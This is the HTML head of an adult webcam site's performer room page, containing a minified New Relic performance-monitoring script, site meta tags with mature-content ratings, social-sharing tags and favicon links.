<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns="http://www.w3.org/1999/html">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script type="text/javascript">(window.NREUM||(NREUM={})).loader_config={xpid:"VQIGWV9aDxACUFNVDgMEUw==",licenseKey:"6f524845d1",applicationID:"24279235"};window.NREUM||(NREUM={}),__nr_require=function(t,e,n){function r(n){if(!e[n]){var o=e[n]={exports:{}};t[n][0].call(o.exports,function(e){var o=t[n][1][e];return r(o||e)},o,o.exports)}return e[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<n.length;o++)r(n[o]);return r}({1:[function(t,e,n){function r(t){try{s.console&&console.log(t)}catch(e){}}var o,i=t("ee"),a=t(25),s={};try{o=localStorage.getItem("__nr_flags").split(","),console&&"function"==typeof console.log&&(s.console=!0,o.indexOf("dev")!==-1&&(s.dev=!0),o.indexOf("nr_dev")!==-1&&(s.nrDev=!0))}catch(c){}s.nrDev&&i.on("internal-error",function(t){r(t.stack)}),s.dev&&i.on("fn-err",function(t,e,n){r(n.stack)}),s.dev&&(r("NR AGENT IN DEVELOPMENT MODE"),r("flags: "+a(s,function(t,e){return t}).join(", ")))},{}],2:[function(t,e,n){function r(t,e,n,r,s){try{l?l-=1:o(s||new UncaughtException(t,e,n),!0)}catch(f){try{i("ierr",[f,c.now(),!0])}catch(d){}}return"function"==typeof u&&u.apply(this,a(arguments))}function UncaughtException(t,e,n){this.message=t||"Uncaught error with no additional information",this.sourceURL=e,this.line=n}function o(t,e){var n=e?null:c.now();i("err",[t,n])}var i=t("handle"),a=t(26),s=t("ee"),c=t("loader"),f=t("gos"),u=window.onerror,d=!1,p="nr@seenError",l=0;c.features.err=!0,t(1),window.onerror=r;try{throw new Error}catch(h){"stack"in h&&(t(13),t(12),"addEventListener"in window&&t(6),c.xhrWrappable&&t(14),d=!0)}s.on("fn-start",function(t,e,n){d&&(l+=1)}),s.on("fn-err",function(t,e,n){d&&!n[p]&&(f(n,p,function(){return!0}),this.thrown=!0,o(n))}),s.on("fn-end",function(){d&&!this.thrown&&l>0&&(l-=1)}),s.on("internal-error",function(t){i("ierr",[t,c.now(),!0])})},{}],3:[function(t,e,n){t("loader").features.ins=!0},{}],4:[function(t,e,n){function r(){L++,C=g.hash,this[u]=y.now()}function o(){L--,g.hash!==C&&i(0,!0);var t=y.now();this[h]=~~this[h]+t-this[u],this[d]=t}function i(t,e){E.emit("newURL",[""+g,e])}function a(t,e){t.on(e,function(){this[e]=y.now()})}var s="-start",c="-end",f="-body",u="fn"+s,d="fn"+c,p="cb"+s,l="cb"+c,h="jsTime",m="fetch",v="addEventListener",w=window,g=w.location,y=t("loader");if(w[v]&&y.xhrWrappable){var x=t(10),b=t(11),E=t(8),O=t(6),R=t(13),P=t(7),T=t(14),N=t(9),M=t("ee"),S=M.get("tracer");t(16),y.features.spa=!0;var C,L=0;M.on(u,r),M.on(p,r),M.on(d,o),M.on(l,o),M.buffer([u,d,"xhr-done","xhr-resolved"]),O.buffer([u]),R.buffer(["setTimeout"+c,"clearTimeout"+s,u]),T.buffer([u,"new-xhr","send-xhr"+s]),P.buffer([m+s,m+"-done",m+f+s,m+f+c]),E.buffer(["newURL"]),x.buffer([u]),b.buffer(["propagate",p,l,"executor-err","resolve"+s]),S.buffer([u,"no-"+u]),N.buffer(["new-jsonp","cb-start","jsonp-error","jsonp-end"]),a(T,"send-xhr"+s),a(M,"xhr-resolved"),a(M,"xhr-done"),a(P,m+s),a(P,m+"-done"),a(N,"new-jsonp"),a(N,"jsonp-end"),a(N,"cb-start"),E.on("pushState-end",i),E.on("replaceState-end",i),w[v]("hashchange",i,!0),w[v]("load",i,!0),w[v]("popstate",function(){i(0,L>1)},!0)}},{}],5:[function(t,e,n){function r(t){}if(window.performance&&window.performance.timing&&window.performance.getEntriesByType){var o=t("ee"),i=t("handle"),a=t(13),s=t(12),c="learResourceTimings",f="addEventListener",u="resourcetimingbufferfull",d="bstResource",p="resource",l="-start",h="-end",m="fn"+l,v="fn"+h,w="bstTimer",g="pushState",y=t("loader");y.features.stn=!0,t(8),"addEventListener"in window&&t(6);var x=NREUM.o.EV;o.on(m,function(t,e){var n=t[0];n instanceof x&&(this.bstStart=y.now())}),o.on(v,function(t,e){var n=t[0];n instanceof x&&i("bst",[n,e,this.bstStart,y.now()])}),a.on(m,function(t,e,n){this.bstStart=y.now(),this.bstType=n}),a.on(v,function(t,e){i(w,[e,this.bstStart,y.now(),this.bstType])}),s.on(m,function(){this.bstStart=y.now()}),s.on(v,function(t,e){i(w,[e,this.bstStart,y.now(),"requestAnimationFrame"])}),o.on(g+l,function(t){this.time=y.now(),this.startPath=location.pathname+location.hash}),o.on(g+h,function(t){i("bstHist",[location.pathname+location.hash,this.startPath,this.time])}),f in window.performance&&(window.performance["c"+c]?window.performance[f](u,function(t){i(d,[window.performance.getEntriesByType(p)]),window.performance["c"+c]()},!1):window.performance[f]("webkit"+u,function(t){i(d,[window.performance.getEntriesByType(p)]),window.performance["webkitC"+c]()},!1)),document[f]("scroll",r,{passive:!0}),document[f]("keypress",r,!1),document[f]("click",r,!1)}},{}],6:[function(t,e,n){function r(t){for(var e=t;e&&!e.hasOwnProperty(u);)e=Object.getPrototypeOf(e);e&&o(e)}function o(t){s.inPlace(t,[u,d],"-",i)}function i(t,e){return t[1]}var a=t("ee").get("events"),s=t("wrap-function")(a,!0),c=t("gos"),f=XMLHttpRequest,u="addEventListener",d="removeEventListener";e.exports=a,"getPrototypeOf"in Object?(r(document),r(window),r(f.prototype)):f.prototype.hasOwnProperty(u)&&(o(window),o(f.prototype)),a.on(u+"-start",function(t,e){var n=t[1],r=c(n,"nr@wrapped",function(){function t(){if("function"==typeof n.handleEvent)return n.handleEvent.apply(n,arguments)}var e={object:t,"function":n}[typeof n];return e?s(e,"fn-",null,e.name||"anonymous"):n});this.wrapped=t[1]=r}),a.on(d+"-start",function(t){t[1]=this.wrapped||t[1]})},{}],7:[function(t,e,n){function r(t,e,n){var r=t[e];"function"==typeof r&&(t[e]=function(){var t=i(arguments),e={};o.emit(n+"before-start",[t],e);var a;e[m]&&e[m].dt&&(a=e[m].dt);var s=r.apply(this,t);return o.emit(n+"start",[t,a],s),s.then(function(t){return o.emit(n+"end",[null,t],s),t},function(t){throw o.emit(n+"end",[t],s),t})})}var o=t("ee").get("fetch"),i=t(26),a=t(25);e.exports=o;var s=window,c="fetch-",f=c+"body-",u=["arrayBuffer","blob","json","text","formData"],d=s.Request,p=s.Response,l=s.fetch,h="prototype",m="nr@context";d&&p&&l&&(a(u,function(t,e){r(d[h],e,f),r(p[h],e,f)}),r(s,"fetch",c),o.on(c+"end",function(t,e){var n=this;if(e){var r=e.headers.get("content-length");null!==r&&(n.rxSize=r),o.emit(c+"done",[null,e],n)}else o.emit(c+"done",[t],n)}))},{}],8:[function(t,e,n){var r=t("ee").get("history"),o=t("wrap-function")(r);e.exports=r;var i=window.history&&window.history.constructor&&window.history.constructor.prototype,a=window.history;i&&i.pushState&&i.replaceState&&(a=i),o.inPlace(a,["pushState","replaceState"],"-")},{}],9:[function(t,e,n){function r(t){function e(){c.emit("jsonp-end",[],p),t.removeEventListener("load",e,!1),t.removeEventListener("error",n,!1)}function n(){c.emit("jsonp-error",[],p),c.emit("jsonp-end",[],p),t.removeEventListener("load",e,!1),t.removeEventListener("error",n,!1)}var r=t&&"string"==typeof t.nodeName&&"script"===t.nodeName.toLowerCase();if(r){var o="function"==typeof t.addEventListener;if(o){var a=i(t.src);if(a){var u=s(a),d="function"==typeof u.parent[u.key];if(d){var p={};f.inPlace(u.parent,[u.key],"cb-",p),t.addEventListener("load",e,!1),t.addEventListener("error",n,!1),c.emit("new-jsonp",[t.src],p)}}}}}function o(){return"addEventListener"in window}function i(t){var e=t.match(u);return e?e[1]:null}function a(t,e){var n=t.match(p),r=n[1],o=n[3];return o?a(o,e[r]):e[r]}function s(t){var e=t.match(d);return e&&e.length>=3?{key:e[2],parent:a(e[1],window)}:{key:t,parent:window}}var c=t("ee").get("jsonp"),f=t("wrap-function")(c);if(e.exports=c,o()){var u=/[?&](?:callback|cb)=([^&#]+)/,d=/(.*)\.([^.]+)/,p=/^(\w+)(\.|$)(.*)$/,l=["appendChild","insertBefore","replaceChild"];Node&&Node.prototype&&Node.prototype.appendChild?f.inPlace(Node.prototype,l,"dom-"):(f.inPlace(HTMLElement.prototype,l,"dom-"),f.inPlace(HTMLHeadElement.prototype,l,"dom-"),f.inPlace(HTMLBodyElement.prototype,l,"dom-")),c.on("dom-start",function(t){r(t[0])})}},{}],10:[function(t,e,n){var r=t("ee").get("mutation"),o=t("wrap-function")(r),i=NREUM.o.MO;e.exports=r,i&&(window.MutationObserver=function(t){return this instanceof i?new i(o(t,"fn-")):i.apply(this,arguments)},MutationObserver.prototype=i.prototype)},{}],11:[function(t,e,n){function r(t){var e=a.context(),n=s(t,"executor-",e),r=new f(n);return a.context(r).getCtx=function(){return e},a.emit("new-promise",[r,e],e),r}function o(t,e){return e}var i=t("wrap-function"),a=t("ee").get("promise"),s=i(a),c=t(25),f=NREUM.o.PR;e.exports=a,f&&(window.Promise=r,["all","race"].forEach(function(t){var e=f[t];f[t]=function(n){function r(t){return function(){a.emit("propagate",[null,!o],i),o=o||!t}}var o=!1;c(n,function(e,n){Promise.resolve(n).then(r("all"===t),r(!1))});var i=e.apply(f,arguments),s=f.resolve(i);return s}}),["resolve","reject"].forEach(function(t){var e=f[t];f[t]=function(t){var n=e.apply(f,arguments);return t!==n&&a.emit("propagate",[t,!0],n),n}}),f.prototype["catch"]=function(t){return this.then(null,t)},f.prototype=Object.create(f.prototype,{constructor:{value:r}}),c(Object.getOwnPropertyNames(f),function(t,e){try{r[e]=f[e]}catch(n){}}),a.on("executor-start",function(t){t[0]=s(t[0],"resolve-",this),t[1]=s(t[1],"resolve-",this)}),a.on("executor-err",function(t,e,n){t[1](n)}),s.inPlace(f.prototype,["then"],"then-",o),a.on("then-start",function(t,e){this.promise=e,t[0]=s(t[0],"cb-",this),t[1]=s(t[1],"cb-",this)}),a.on("then-end",function(t,e,n){this.nextPromise=n;var r=this.promise;a.emit("propagate",[r,!0],n)}),a.on("cb-end",function(t,e,n){a.emit("propagate",[n,!0],this.nextPromise)}),a.on("propagate",function(t,e,n){this.getCtx&&!e||(this.getCtx=function(){if(t instanceof Promise)var e=a.context(t);return e&&e.getCtx?e.getCtx():this})}),r.toString=function(){return""+f})},{}],12:[function(t,e,n){var r=t("ee").get("raf"),o=t("wrap-function")(r),i="equestAnimationFrame";e.exports=r,o.inPlace(window,["r"+i,"mozR"+i,"webkitR"+i,"msR"+i],"raf-"),r.on("raf-start",function(t){t[0]=o(t[0],"fn-")})},{}],13:[function(t,e,n){function r(t,e,n){t[0]=a(t[0],"fn-",null,n)}function o(t,e,n){this.method=n,this.timerDuration=isNaN(t[1])?0:+t[1],t[0]=a(t[0],"fn-",this,n)}var i=t("ee").get("timer"),a=t("wrap-function")(i),s="setTimeout",c="setInterval",f="clearTimeout",u="-start",d="-";e.exports=i,a.inPlace(window,[s,"setImmediate"],s+d),a.inPlace(window,[c],c+d),a.inPlace(window,[f,"clearImmediate"],f+d),i.on(c+u,r),i.on(s+u,o)},{}],14:[function(t,e,n){function r(t,e){d.inPlace(e,["onreadystatechange"],"fn-",s)}function o(){var t=this,e=u.context(t);t.readyState>3&&!e.resolved&&(e.resolved=!0,u.emit("xhr-resolved",[],t)),d.inPlace(t,g,"fn-",s)}function i(t){y.push(t),h&&(b?b.then(a):v?v(a):(E=-E,O.data=E))}function a(){for(var t=0;t<y.length;t++)r([],y[t]);y.length&&(y=[])}function s(t,e){return e}function c(t,e){for(var n in t)e[n]=t[n];return e}t(6);var f=t("ee"),u=f.get("xhr"),d=t("wrap-function")(u),p=NREUM.o,l=p.XHR,h=p.MO,m=p.PR,v=p.SI,w="readystatechange",g=["onload","onerror","onabort","onloadstart","onloadend","onprogress","ontimeout"],y=[];e.exports=u;var x=window.XMLHttpRequest=function(t){var e=new l(t);try{u.emit("new-xhr",[e],e),e.addEventListener(w,o,!1)}catch(n){try{u.emit("internal-error",[n])}catch(r){}}return e};if(c(l,x),x.prototype=l.prototype,d.inPlace(x.prototype,["open","send"],"-xhr-",s),u.on("send-xhr-start",function(t,e){r(t,e),i(e)}),u.on("open-xhr-start",r),h){var b=m&&m.resolve();if(!v&&!m){var E=1,O=document.createTextNode(E);new h(a).observe(O,{characterData:!0})}}else f.on("fn-end",function(t){t[0]&&t[0].type===w||a()})},{}],15:[function(t,e,n){function r(t){if(!i(t))return null;var e=window.NREUM;if(!e.loader_config)return null;var n=(e.loader_config.accountID||"").toString()||null,r=(e.loader_config.agentID||"").toString()||null,s=(e.loader_config.trustKey||"").toString()||null;if(!n||!r)return null;var c=a.generateCatId(),f=a.generateCatId(),u=Date.now(),d=o(c,f,u,n,r,s);return{header:d,guid:c,traceId:f,timestamp:u}}function o(t,e,n,r,o,i){var a="btoa"in window&&"function"==typeof window.btoa;if(!a)return null;var s={v:[0,1],d:{ty:"Browser",ac:r,ap:o,id:t,tr:e,ti:n}};return i&&r!==i&&(s.d.tk=i),btoa(JSON.stringify(s))}function i(t){var e=!1,n=!1,r={};if("init"in NREUM&&"distributed_tracing"in NREUM.init&&(r=NREUM.init.distributed_tracing,n=!!r.enabled),n)if(t.sameOrigin)e=!0;else if(r.allowed_origins instanceof Array)for(var o=0;o<r.allowed_origins.length;o++){var i=s(r.allowed_origins[o]);if(t.hostname===i.hostname&&t.protocol===i.protocol&&t.port===i.port){e=!0;break}}return n&&e}var a=t(23),s=t(17);e.exports={generateTracePayload:r,shouldGenerateTrace:i}},{}],16:[function(t,e,n){function r(t){var e=this.params,n=this.metrics;if(!this.ended){this.ended=!0;for(var r=0;r<p;r++)t.removeEventListener(d[r],this.listener,!1);e.aborted||(n.duration=a.now()-this.startTime,this.loadCaptureCalled||4!==t.readyState?null==e.status&&(e.status=0):i(this,t),n.cbTime=this.cbTime,u.emit("xhr-done",[t],t),s("xhr",[e,n,this.startTime]))}}function o(t,e){var n=c(e),r=t.params;r.host=n.hostname+":"+n.port,r.pathname=n.pathname,t.parsedOrigin=c(e),t.sameOrigin=t.parsedOrigin.sameOrigin}function i(t,e){t.params.status=e.status;var n=v(e,t.lastSize);if(n&&(t.metrics.rxSize=n),t.sameOrigin){var r=e.getResponseHeader("X-NewRelic-App-Data");r&&(t.params.cat=r.split(", ").pop())}t.loadCaptureCalled=!0}var a=t("loader");if(a.xhrWrappable){var s=t("handle"),c=t(17),f=t(15).generateTracePayload,u=t("ee"),d=["load","error","abort","timeout"],p=d.length,l=t("id"),h=t(21),m=t(20),v=t(18),w=window.XMLHttpRequest;a.features.xhr=!0,t(14),t(7),u.on("new-xhr",function(t){var e=this;e.totalCbs=0,e.called=0,e.cbTime=0,e.end=r,e.ended=!1,e.xhrGuids={},e.lastSize=null,e.loadCaptureCalled=!1,t.addEventListener("load",function(n){i(e,t)},!1),h&&(h>34||h<10)||window.opera||t.addEventListener("progress",function(t){e.lastSize=t.loaded},!1)}),u.on("open-xhr-start",function(t){this.params={method:t[0]},o(this,t[1]),this.metrics={}}),u.on("open-xhr-end",function(t,e){"loader_config"in NREUM&&"xpid"in NREUM.loader_config&&this.sameOrigin&&e.setRequestHeader("X-NewRelic-ID",NREUM.loader_config.xpid);var n=f(this.parsedOrigin);n&&n.header&&(e.setRequestHeader("newrelic",n.header),this.dt=n)}),u.on("send-xhr-start",function(t,e){var n=this.metrics,r=t[0],o=this;if(n&&r){var i=m(r);i&&(n.txSize=i)}this.startTime=a.now(),this.listener=function(t){try{"abort"!==t.type||o.loadCaptureCalled||(o.params.aborted=!0),("load"!==t.type||o.called===o.totalCbs&&(o.onloadCalled||"function"!=typeof e.onload))&&o.end(e)}catch(n){try{u.emit("internal-error",[n])}catch(r){}}};for(var s=0;s<p;s++)e.addEventListener(d[s],this.listener,!1)}),u.on("xhr-cb-time",function(t,e,n){this.cbTime+=t,e?this.onloadCalled=!0:this.called+=1,this.called!==this.totalCbs||!this.onloadCalled&&"function"==typeof n.onload||this.end(n)}),u.on("xhr-load-added",function(t,e){var n=""+l(t)+!!e;this.xhrGuids&&!this.xhrGuids[n]&&(this.xhrGuids[n]=!0,this.totalCbs+=1)}),u.on("xhr-load-removed",function(t,e){var n=""+l(t)+!!e;this.xhrGuids&&this.xhrGuids[n]&&(delete this.xhrGuids[n],this.totalCbs-=1)}),u.on("addEventListener-end",function(t,e){e instanceof w&&"load"===t[0]&&u.emit("xhr-load-added",[t[1],t[2]],e)}),u.on("removeEventListener-end",function(t,e){e instanceof w&&"load"===t[0]&&u.emit("xhr-load-removed",[t[1],t[2]],e)}),u.on("fn-start",function(t,e,n){e instanceof w&&("onload"===n&&(this.onload=!0),("load"===(t[0]&&t[0].type)||this.onload)&&(this.xhrCbStart=a.now()))}),u.on("fn-end",function(t,e){this.xhrCbStart&&u.emit("xhr-cb-time",[a.now()-this.xhrCbStart,this.onload,e],e)}),u.on("fetch-before-start",function(t){var e,n=t[1]||{};"string"==typeof t[0]?e=t[0]:t[0]&&t[0].url&&(e=t[0].url),e&&(this.parsedOrigin=c(e),this.sameOrigin=this.parsedOrigin.sameOrigin);var r=f(this.parsedOrigin);if(r&&r.header){var o=r.header;if("string"==typeof t[0]){var i={};for(var a in n)i[a]=n[a];i.headers=new Headers(n.headers||{}),i.headers.set("newrelic",o),this.dt=r,t.length>1?t[1]=i:t.push(i)}else t[0]&&t[0].headers&&(t[0].headers.append("newrelic",o),this.dt=r)}})}},{}],17:[function(t,e,n){var r={};e.exports=function(t){if(t in r)return r[t];var e=document.createElement("a"),n=window.location,o={};e.href=t,o.port=e.port;var i=e.href.split("://");!o.port&&i[1]&&(o.port=i[1].split("/")[0].split("@").pop().split(":")[1]),o.port&&"0"!==o.port||(o.port="https"===i[0]?"443":"80"),o.hostname=e.hostname||n.hostname,o.pathname=e.pathname,o.protocol=i[0],"/"!==o.pathname.charAt(0)&&(o.pathname="/"+o.pathname);var a=!e.protocol||":"===e.protocol||e.protocol===n.protocol,s=e.hostname===document.domain&&e.port===n.port;return o.sameOrigin=a&&(!e.hostname||s),"/"===o.pathname&&(r[t]=o),o}},{}],18:[function(t,e,n){function r(t,e){var n=t.responseType;return"json"===n&&null!==e?e:"arraybuffer"===n||"blob"===n||"json"===n?o(t.response):"text"===n||""===n||void 0===n?o(t.responseText):void 0}var o=t(20);e.exports=r},{}],19:[function(t,e,n){function r(){}function o(t,e,n){return function(){return i(t,[f.now()].concat(s(arguments)),e?null:this,n),e?void 0:this}}var i=t("handle"),a=t(25),s=t(26),c=t("ee").get("tracer"),f=t("loader"),u=NREUM;"undefined"==typeof window.newrelic&&(newrelic=u);var d=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],p="api-",l=p+"ixn-";a(d,function(t,e){u[e]=o(p+e,!0,"api")}),u.addPageAction=o(p+"addPageAction",!0),u.setCurrentRouteName=o(p+"routeName",!0),e.exports=newrelic,u.interaction=function(){return(new r).get()};var h=r.prototype={createTracer:function(t,e){var n={},r=this,o="function"==typeof e;return i(l+"tracer",[f.now(),t,n],r),function(){if(c.emit((o?"":"no-")+"fn-start",[f.now(),r,o],n),o)try{return e.apply(this,arguments)}catch(t){throw c.emit("fn-err",[arguments,this,t],n),t}finally{c.emit("fn-end",[f.now()],n)}}}};a("actionText,setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(t,e){h[e]=o(l+e)}),newrelic.noticeError=function(t,e){"string"==typeof t&&(t=new Error(t)),i("err",[t,f.now(),!1,e])}},{}],20:[function(t,e,n){e.exports=function(t){if("string"==typeof t&&t.length)return t.length;if("object"==typeof t){if("undefined"!=typeof ArrayBuffer&&t instanceof ArrayBuffer&&t.byteLength)return t.byteLength;if("undefined"!=typeof Blob&&t instanceof Blob&&t.size)return t.size;if(!("undefined"!=typeof FormData&&t instanceof FormData))try{return JSON.stringify(t).length}catch(e){return}}}},{}],21:[function(t,e,n){var r=0,o=navigator.userAgent.match(/Firefox[\/\s](\d+\.\d+)/);o&&(r=+o[1]),e.exports=r},{}],22:[function(t,e,n){function r(t,e){var n=t.getEntries();n.forEach(function(t){"first-paint"===t.name?c("timing",["fp",Math.floor(t.startTime)]):"first-contentful-paint"===t.name&&c("timing",["fcp",Math.floor(t.startTime)])})}function o(t,e){var n=t.getEntries();n.length>0&&c("lcp",[n[n.length-1]])}function i(t){if(t instanceof u&&!p){var e,n=Math.round(t.timeStamp);e=n>1e12?Date.now()-n:f.now()-n,p=!0,c("timing",["fi",n,{type:t.type,fid:e}])}}if(!("init"in NREUM&&"page_view_timing"in NREUM.init&&"enabled"in NREUM.init.page_view_timing&&NREUM.init.page_view_timing.enabled===!1)){var a,s,c=t("handle"),f=t("loader"),u=NREUM.o.EV;if("PerformanceObserver"in window&&"function"==typeof window.PerformanceObserver){a=new PerformanceObserver(r),s=new PerformanceObserver(o);try{a.observe({entryTypes:["paint"]}),s.observe({entryTypes:["largest-contentful-paint"]})}catch(d){}}if("addEventListener"in document){var p=!1,l=["click","keydown","mousedown","pointerdown","touchstart"];l.forEach(function(t){document.addEventListener(t,i,!1)})}}},{}],23:[function(t,e,n){function r(){function t(){return e?15&e[n++]:16*Math.random()|0}var e=null,n=0,r=window.crypto||window.msCrypto;r&&r.getRandomValues&&(e=r.getRandomValues(new Uint8Array(31)));for(var o,i="xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx",a="",s=0;s<i.length;s++)o=i[s],"x"===o?a+=t().toString(16):"y"===o?(o=3&t()|8,a+=o.toString(16)):a+=o;return a}function o(){function t(){return e?15&e[n++]:16*Math.random()|0}var e=null,n=0,r=window.crypto||window.msCrypto;r&&r.getRandomValues&&Uint8Array&&(e=r.getRandomValues(new Uint8Array(31)));for(var o=[],i=0;i<16;i++)o.push(t().toString(16));return o.join("")}e.exports={generateUuid:r,generateCatId:o}},{}],24:[function(t,e,n){function r(t,e){if(!o)return!1;if(t!==o)return!1;if(!e)return!0;if(!i)return!1;for(var n=i.split("."),r=e.split("."),a=0;a<r.length;a++)if(r[a]!==n[a])return!1;return!0}var o=null,i=null,a=/Version\/(\S+)\s+Safari/;if(navigator.userAgent){var s=navigator.userAgent,c=s.match(a);c&&s.indexOf("Chrome")===-1&&s.indexOf("Chromium")===-1&&(o="Safari",i=c[1])}e.exports={agent:o,version:i,match:r}},{}],25:[function(t,e,n){function r(t,e){var n=[],r="",i=0;for(r in t)o.call(t,r)&&(n[i]=e(r,t[r]),i+=1);return n}var o=Object.prototype.hasOwnProperty;e.exports=r},{}],26:[function(t,e,n){function r(t,e,n){e||(e=0),"undefined"==typeof n&&(n=t?t.length:0);for(var r=-1,o=n-e||0,i=Array(o<0?0:o);++r<o;)i[r]=t[e+r];return i}e.exports=r},{}],27:[function(t,e,n){e.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],ee:[function(t,e,n){function r(){}function o(t){function e(t){return t&&t instanceof r?t:t?c(t,s,i):i()}function n(n,r,o,i){if(!p.aborted||i){t&&t(n,r,o);for(var a=e(o),s=m(n),c=s.length,f=0;f<c;f++)s[f].apply(a,r);var d=u[y[n]];return d&&d.push([x,n,r,a]),a}}function l(t,e){g[t]=m(t).concat(e)}function h(t,e){var n=g[t];if(n)for(var r=0;r<n.length;r++)n[r]===e&&n.splice(r,1)}function m(t){return g[t]||[]}function v(t){return d[t]=d[t]||o(n)}function w(t,e){f(t,function(t,n){e=e||"feature",y[n]=e,e in u||(u[e]=[])})}var g={},y={},x={on:l,addEventListener:l,removeEventListener:h,emit:n,get:v,listeners:m,context:e,buffer:w,abort:a,aborted:!1};return x}function i(){return new r}function a(){(u.api||u.feature)&&(p.aborted=!0,u=p.backlog={})}var s="nr@context",c=t("gos"),f=t(25),u={},d={},p=e.exports=o();p.backlog=u},{}],gos:[function(t,e,n){function r(t,e,n){if(o.call(t,e))return t[e];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(t,e,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return t[e]=r,r}var o=Object.prototype.hasOwnProperty;e.exports=r},{}],handle:[function(t,e,n){function r(t,e,n,r){o.buffer([t],r),o.emit(t,e,n)}var o=t("ee").get("handle");e.exports=r,r.ee=o},{}],id:[function(t,e,n){function r(t){var e=typeof t;return!t||"object"!==e&&"function"!==e?-1:t===window?0:a(t,i,function(){return o++})}var o=1,i="nr@id",a=t("gos");e.exports=r},{}],loader:[function(t,e,n){function r(){if(!E++){var t=b.info=NREUM.info,e=l.getElementsByTagName("script")[0];if(setTimeout(u.abort,3e4),!(t&&t.licenseKey&&t.applicationID&&e))return u.abort();f(y,function(e,n){t[e]||(t[e]=n)}),c("mark",["onload",a()+b.offset],null,"api");var n=l.createElement("script");n.src="https://"+t.agent,e.parentNode.insertBefore(n,e)}}function o(){"complete"===l.readyState&&i()}function i(){c("mark",["domContent",a()+b.offset],null,"api")}function a(){return O.exists&&performance.now?Math.round(performance.now()):(s=Math.max((new Date).getTime(),s))-b.offset}var s=(new Date).getTime(),c=t("handle"),f=t(25),u=t("ee"),d=t(24),p=window,l=p.document,h="addEventListener",m="attachEvent",v=p.XMLHttpRequest,w=v&&v.prototype;NREUM.o={ST:setTimeout,SI:p.setImmediate,CT:clearTimeout,XHR:v,REQ:p.Request,EV:p.Event,PR:p.Promise,MO:p.MutationObserver};var g=""+location,y={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-spa-1169.min.js"},x=v&&w&&w[h]&&!/CriOS/.test(navigator.userAgent),b=e.exports={offset:s,now:a,origin:g,features:{},xhrWrappable:x,userAgent:d};t(19),t(22),l[h]?(l[h]("DOMContentLoaded",i,!1),p[h]("load",r,!1)):(l[m]("onreadystatechange",o),p[m]("onload",r)),c("mark",["firstbyte",s],null,"api");var E=0,O=t(27)},{}],"wrap-function":[function(t,e,n){function r(t){return!(t&&t instanceof Function&&t.apply&&!t[a])}var o=t("ee"),i=t(26),a="nr@original",s=Object.prototype.hasOwnProperty,c=!1;e.exports=function(t,e){function n(t,e,n,o){function nrWrapper(){var r,a,s,c;try{a=this,r=i(arguments),s="function"==typeof n?n(r,a):n||{}}catch(f){p([f,"",[r,a,o],s])}u(e+"start",[r,a,o],s);try{return c=t.apply(a,r)}catch(d){throw u(e+"err",[r,a,d],s),d}finally{u(e+"end",[r,a,c],s)}}return r(t)?t:(e||(e=""),nrWrapper[a]=t,d(t,nrWrapper),nrWrapper)}function f(t,e,o,i){o||(o="");var a,s,c,f="-"===o.charAt(0);for(c=0;c<e.length;c++)s=e[c],a=t[s],r(a)||(t[s]=n(a,f?s+o:o,i,s))}function u(n,r,o){if(!c||e){var i=c;c=!0;try{t.emit(n,r,o,e)}catch(a){p([a,n,r,o])}c=i}}function d(t,e){if(Object.defineProperty&&Object.keys)try{var n=Object.keys(t);return n.forEach(function(n){Object.defineProperty(e,n,{get:function(){return t[n]},set:function(e){return t[n]=e,e}})}),e}catch(r){p([r])}for(var o in t)s.call(t,o)&&(e[o]=t[o]);return e}function p(e){try{t.emit("internal-error",e)}catch(n){}}return t||(t=o),n.inPlace=f,n.flag=a,n}},{}]},{},["loader",2,16,5,3,4]);</script>
<meta name="msvalidate.01" content="7198395454E8014E0B82A087701FE16B" />
<meta name="description" content="Enjoy free webcams broadcasted live from amateurs around the world! - Join 100% Free" />
<meta name="keywords" content="adult chat, adult cams, free chat, free cams, live cams" />
<meta name="Rating" content="mature">
<meta name="RATING" content="RTA-5042-1996-1400-1577-RTA" />
<title>Chaturbate - 100% Free Chat &amp; Webcams</title>
<meta property="og:type" content="website" />
<meta property="og:title" content="Watch Katieecage live on Chaturbate!" />
<meta property="og:description" content="car maybe ;) [3516 tokens remaining]" />
<meta property="og:image" content="https://roomimg.stream.highwebmedia.com/ri/katieecage.jpg" />
<meta property="og:image:height" content="270" />
<meta property="og:image:width" content="360" />
<meta property="og:url" content="https://chaturbate.com/katieecage/" />
<meta name="twitter:site" content="@chaturbate" />
<meta name="twitter:card" content="summary" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<link rel="canonical" href="https://chaturbate.com/katieecage/" />
<link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.chaturbate.com/katieecage/">
<link rel="icon" type="image/x-icon" href="https://ssl-ccstatic.highwebmedia.com/favicons/favicon.ico">
<link rel="shortcut icon" type="image/png" href="https://ssl-ccstatic.highwebmedia.com/favicons/android-chrome-192x192.png" sizes="192x192">
<link rel="icon" type="image/png" href="https://ssl-ccstatic.highwebmedia.com/favicons/favicon-96x96.png" sizes="96x96">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="https://ssl-ccstatic.highwebmedia.com/favicons/mstile-144x144.png">
<link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://ssl-ccstatic.highwebmedia.com/favicons/apple-touch-icon-180x180.png">
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://ssl-ccstatic.highwebmedia.com/favicons/apple-touch-icon-144x144.png">
<link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://ssl-ccstatic.highwebmedia.com/favicons/apple-touch-icon-152x152.png">
<link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://ssl-ccstatic.highwebmedia.com/favicons/apple-touch-icon-120x120.png">
